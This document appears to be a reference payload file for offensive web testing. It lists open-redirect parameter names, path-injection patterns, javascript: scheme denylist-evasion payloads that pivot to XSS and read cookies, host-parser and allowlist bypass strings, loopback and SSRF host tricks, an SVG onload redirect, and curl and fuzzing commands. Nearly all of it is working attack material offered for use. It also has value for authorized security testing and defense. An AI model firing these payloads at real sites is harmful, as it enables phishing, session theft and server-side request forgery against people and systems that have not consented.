# Open-redirect payload arsenal & param fuzz list — Open WHEN: you have a confirmed or suspected redirect sink (3xx Location, JS location, meta refresh, OAuth redirect_uri) and the small body list did not fire — cycle this full wordlist + scheme/host-parser bypass corpus

The body already covers userinfo `@`, backslash, whitespace `%09/%0A`,
fragment `#@`, double-encoding `%252f`, IP-numeric (decimal/octal/hex/IPv6),
domain-suffix concat, and the base64 `data:` example. Do NOT re-test those —
this file is the long-tail wordlist and the heavier `javascript:`/host-parser
strings that are NOT in the body.

## Full parameter fuzz wordlist

Spray each name with a known-external marker value (`https://oast.live`,
`//oast.live`, or your collaborator host). One name often works where the
common 25 in the body fail. Order: most-yielding first.

```text
next  url  dest  destination  redir  redirect  redirect_uri  redirect_url
target  rurl  return  returnTo  return_to  return_path  continue  goto
checkout_url  image_url  view  go  to  out  r  u  u1  uri  Url  RedirectUrl
ReturnUrl  Redirect  desturl  recurl  sp_url  service  page  link  src
location  origin  originUrl  forward  forward_url  forwardurl  callback_url
clickurl  click?u  jump  jump_url  burl  backurl  request  qurl  rit_url
success  data  login  logout  ext  pic  action  action_url  allinurl  q
linkAddress  tc?src  j?url  cgi-bin/redirect.cgi  out  away
```

Path-position injection (no query param at all):

```text
/{payload}                         e.g. /https://oast.live
/redirect/{payload}
/redirect/http://oast.live         path-segment swallow
/redirect/../http://oast.live      relative-path break-out
/out/{payload}     /go/{payload}     /r/{payload}     /link/{payload}
/cgi-bin/redirect.cgi?{payload}
```

## javascript: scheme bypass corpus (redirect → XSS pivot)

Use when the sink renders/executes the destination (DOM `location=`,
`href`, anchor) rather than emitting a server `Location`. The body only
names `javascript:` bare — these are the filter-evasion forms.

```text
javascript:alert(1)  javascript:confirm(1)  javascript:prompt(1)  javascript:alert(document.domain)

# CRLF inside the word "javascript" to defeat a literal "javascript" denylist
java%0d%0ascript%0d%0a:alert(0)

# "://" makes a JS line-comment; newline starts the real code (double-encode)
# This specific form bypasses PHP FILTER_VALIDATE_URL
javascript://%250Aalert(1)
javascript://%250Aalert(1)//?1            # query-needed variant via comment
javascript://%250A1?alert(1):0            # query-needed variant via ternary
javascript://%0aalert(1)
javascript://%250Alert(document.location=document.cookie)

# Whitelisted host stuffed before the newline so host-checks pass
javascript://sub.domain.com/%0Aalert(1)
javascript://whitelisted.com/?z=%0Aalert(1)
jaVAscript://whitelisted.com//%0d%0aalert(1);//
javascript://whitelisted.com?%a0alert%281%29        # %a0 = non-break space sep
javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)

# Leading tab / control / slash noise to slip past prefix anchors
%09Jav%09ascript:alert(document.domain)
/%09/javascript:alert(1)
//%5cjavascript:alert(1)
/%5cjavascript:alert(1)
//javascript:alert(1)
/javascript:alert(1)
<>javascript:alert(1)
/x:1/:///%01javascript:alert(document.cookie)/

# Backslash-escaped letters — parser strips "\", denylist never sees "javascript"
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)

# Breaking out of a JS string assignment ( var x="USERINPUT" )
";alert(0);//
```

`data:` XSS payload body (when scheme allowlist is absent) — base64 of
`<script>alert(1)</script>`:

```text
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

## Host-parser confusion strings (allowlist evasion, not in body)

```text
# Unicode "." substitutes — ideographic full stop / full-width
//google%E3%80%82com            # %E3%80%82 = 。  validator sees no "."
/?redir=google。com
http://a.com／X.b.com            # U+FF0F fullwidth solidus as path/host split

# Host/Split unicode normalization (NFKC expands one glyph into host+path)
https://evil.c℀.example.com     # ℀ normalizes to "a/c" -> host becomes evil.ca
https://evil.c⁄⁄attacker.com    # fraction-slash glyphs normalize to "//"

# Null byte truncation of the appended trusted suffix
//google%00.com
evil.example%00

# "?" — browser rewrites a bare "?" to "/?", so trusted host becomes path
http://www.trusted.com?http://www.evil.com/
http://www.trusted.com?folder/www.evil.com

# Trusted host turned into a folder under the attacker root (or vice-versa)
http://www.trusted.com/http://www.evil.com/
http://www.trusted.com/folder/www.evil.com

# "https:" with no slashes bypasses a "//"-only denylist
https:google.com
http:evil.com

# "\/\/" / "/\/" escaped-slash forms bypass "//"-only denylist
\/\/google.com/
/\/google.com/

# prefix/suffix substring-match flaws (bare contains("trusted"))
https://trusted.example.evil.example/
https://evil.example/trusted.example

# break server-side absolute-URL detection when only a path is accepted
/\\evil.example
/..//evil.example
```

## Loopback / internal host notations (redirect-to-localhost, SSRF feeder)

When the validator claims "only internal/whitelisted hosts" or a server-side
fetcher follows the 3xx. IP-numeric forms are in the body — these are the
wildcard-DNS and casing tricks that are NOT.

```text
# Wildcard DNS that resolves to 127.0.0.1 (passes "*.allowed" host rules)
127.0.0.1.sslip.io     lvh.me     localtest.me     traefik.me     nip.io
127.0.0.1.nip.io
# Casing / trailing-dot loopback
localhost.   LOCALHOST   127.0.0.1.
# IPv6 loopback spellings
[::1]   [0:0:0:0:0:0:0:1]   [::ffff:127.0.0.1]
```

## SVG upload → redirect (when an image/file upload is reflected as a page)

```html
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg onload="window.location='https://oast.live'"
     xmlns="http://www.w3.org/2000/svg"></svg>
```

## Quick triage commands

```bash
# Read FIRST-hop Location only (don't auto-follow; the first hop is the bug)
curl -s -I "https://target.tld/redirect?url=//oast.live" | grep -i '^Location:'

# HTTP Parameter Pollution — last value often wins past a first-value validator
curl -s -I "https://target.tld/r?next=whitelisted.com&next=oast.live" | grep -i '^Location:'

# Grep built JS for client-side redirect sinks reading query/hash
rg -n "location\.(assign|replace|href)|window\.open|history\.(pushState|replaceState)|returnUrl|return_to|continue|next=" dist/ build/ static/ src/

# Mine archived URLs, keep redirect-shaped params, then fuzz with OpenRedireX
gau target.tld | rg -NI "(url=|next=|redir=|redirect|dest=|rurl=|return=|continue=)" | sort -u > candidates.txt
cat candidates.txt | openredirex -p payloads.txt -k FUZZ -c 50 > results.txt
awk '/30[1237]|Location:/I' results.txt
```

Redirect status codes that confirm a server-driven hit: `301 302 303 307 308`.
Bodyless redirects still phish — also grep responses for
`<meta http-equiv="refresh" content="0;url=//oast.live">`.
